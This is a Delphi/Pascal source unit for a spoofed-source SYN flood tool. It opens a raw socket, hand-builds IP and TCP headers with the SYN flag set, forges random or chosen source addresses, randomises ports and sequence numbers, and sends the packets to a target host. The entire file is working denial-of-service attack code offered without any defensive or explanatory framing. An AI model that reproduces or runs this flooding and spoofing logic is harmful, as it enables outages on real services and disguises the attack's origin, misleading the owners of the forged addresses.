   unit u_main;

   interface

   uses
     u_winsck2, u_sysutils, u_sockhdr;

   type
     TPorts = array of Word;
     TSynOptions = packed record
       Delay: Cardinal;
       DstPorts: TPorts;
       HedefAdres: TSockAddrIn;
       Num: Cardinal;
       RandomSeek: Integer;
       Sended: Cardinal;
       Socket: TSocket;
       SpoofIP: Cardinal;
       SrcPorts: TPorts;
     end;

   var
     SynOpt: TSynOptions;

     function GetPorts(Ports: string): TPorts;
     function GetRandomIP: Cardinal;
     function GetRandomValue(const Range: Integer): Integer;
     function Resolve(const host: PChar): Cardinal;
     function ValidPort(const Port: string): Boolean;
     procedure CreateSocket;
     procedure SendSyn(const sport, dport: Word);
     procedure SendSyn_FillIPhdr;
     procedure SendSyn_FillTCPhdr(const sport, dport: Word);
   //  procedure SetDefaultOptions;
   //  procedure SetParams;
     procedure Usage(const Path: string);

   implementation

   function GetPorts(Ports: string): TPorts;
     procedure AddPort(const Port: string);
     begin
       if ValidPort(Port) then
       begin
         SetLength(Result, Length(Result) + 1);
         Result[High(Result)] := StrtoInt(Port);
       end
       else
     end;
   var
     i: Integer;
     S: string;
   begin
     i := Pos(',', Ports);
     while i > 0 do
     begin
       S := Copy(Ports, 1, i - 1);
       AddPort(S);
       Delete(Ports, 1, i);
       i := Pos(',', Ports);
     end;
     AddPort(Ports);
   end;

   function GetRandomIP: Cardinal;
   var
     IPArray: array [0..3] of Byte;
     i: Integer;
   begin
     for i := 0 to 3 do
       IPArray[i] := GetRandomValue(255) + 1;
     Move(IPArray, Result, Sizeof(Result));
   end;

   function GetRandomValue(const Range: Integer): Integer; // function for getting different random
   begin                                                   // values between very short times
     SynOpt.RandomSeek := (SynOpt.RandomSeek xor Range) + 1;
     Result := (Random(High(Integer)) xor SynOpt.RandomSeek) mod Range;
   end;

   function Resolve(const host: PChar): Cardinal; // function for resolving host to ip
   var
     InAddr: TInAddr;
     HostEnt: PHostEnt;
   begin
     InAddr.S_addr := inet_addr(host); // convert ip address format (ex: 127.0.0.1) to cardinal
     if InAddr.S_addr = INADDR_NONE then // if it is not a ip address then resolve it
     begin
       HostEnt := GetHostByName(host);
       if not Assigned(HostEnt) then // if couldn't resolve the host then exit
       begin
         Halt(0);
       end;
       Move((HostEnt^.h_addr_list^)^, InAddr.S_addr, HostEnt^.h_length);
     end;
     Result := InAddr.S_addr;
   end;

   function ValidPort(const Port: string): Boolean;
   var
     prt: Integer;
   begin
     prt := StrtoIntDef(Port, -1);
     Result := (prt > -1) and (prt < 65536); // a valid port must be between -1 and 65536
   end;

   procedure CreateSocket;
   begin
     SynOpt.Socket := Socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if SynOpt.Socket = INVALID_SOCKET then
     begin
       Halt(0);
     end;
     if SetSockOpt(SynOpt.Socket, IPPROTO_IP, IP_HDRINCL, '1', 4) <> 0 then
     begin // if can't set the IP_HDRINCL option then exit
       Halt(0);
     end;
   end;

   const
     Len = 40;

   var
     Buf: array [0..(Len - 1)] of Char;
     IPhdr: PIPhdr = @Buf[0];
     TCPhdr: PTCPhdr = @Buf[20];

   procedure SendSyn(const sport, dport: Word);
   begin
     FillChar(Buf, Len, 0);
     SendSyn_FillIPhdr;
     SendSyn_FillTCPhdr(sport, dport);
     Sendto(SynOpt.Socket, Buf, Len, 0, SynOpt.HedefAdres, Sizeof(SynOpt.HedefAdres));
   end;

   procedure SendSyn_FillIPhdr;
   begin
     IPhdr.ip_verlen := $45;
     IPhdr.ip_tos := 0;
     IPhdr.ip_len := htons(Len);
     IPhdr.ip_id := GetRandomValue(High(Word)) + 1;
     IPhdr.ip_ttl := 255;
     IPhdr.ip_p := 6; // 6 = TCP
     if SynOpt.SpoofIP = 0 then
       IPhdr.ip_src := GetRandomIP
     else
       IPhdr.ip_src := SynOpt.SpoofIP;
     IPhdr.ip_dst := SynOpt.HedefAdres.sin_addr.S_addr;
     IPhdr.ip_sum := CheckSum(@IPhdr^, 20);
   end;

   var
     SeudoBuf: array [0..31] of Char;

   procedure SendSyn_FillTCPhdr(const sport, dport: Word);
   var
     PSeudohdr: Ppseudohdr_tcp;
   begin
     if sport = 0 then
       TCPhdr.tcp_src := GetRandomValue(High(Word)) + 1
     else
       TCPhdr.tcp_src := htons(sport);
     if dport = 0 then
       TCPhdr.tcp_dst := GetRandomValue(High(Word)) + 1
     else
       TCPhdr.tcp_dst := htons(dport);
     TCPhdr.tcp_seq := GetRandomValue(High(Integer)) + 1;
     TCPhdr.tcp_ack := GetRandomValue(High(Integer)) + 1;
     TCPhdr.tcp_flags := $02; // 0x02 = syn flag
     TCPhdr.tcp_win := GetRandomValue(High(Word)) + 1;
     TCPhdr.tcp_urp := GetRandomValue(High(Word)) + 1;
     FillChar(SeudoBuf, Sizeof(SeudoBuf), 0);
     PSeudohdr := Ppseudohdr_tcp(@SeudoBuf); // for a correct tcp checksum
     PSeudohdr.saddr := IPhdr.ip_src;        // we must calculate it with a pseudo header
     PSeudohdr.daddr := IPhdr.ip_dst;
     PSeudohdr.protocol := 6;
     PSeudohdr.length := htons(20);
     PSeudohdr.tcphdr := TCPhdr^;
     TCPhdr.tcp_sum := CheckSum(@PSeudohdr^, 32);
   end;

   {
   procedure SetDefaultOptions;
   begin
     SynOpt.HedefAdres.sin_addr.S_addr := Resolve(PChar(ParamStr(1)));
     SetLength(SynOpt.DstPorts, 1);
     SynOpt.DstPorts[0] := 0;
     SynOpt.HedefAdres.sin_family := AF_INET;
     SynOpt.HedefAdres.sin_port := GetRandomValue(High(Word)) + 1;
     SetLength(SynOpt.SrcPorts, 1);
     SynOpt.SrcPorts[0] := 0;
   end;
   }

   procedure Usage(const Path: string);
   begin
     Halt(0);
   end;

   end.
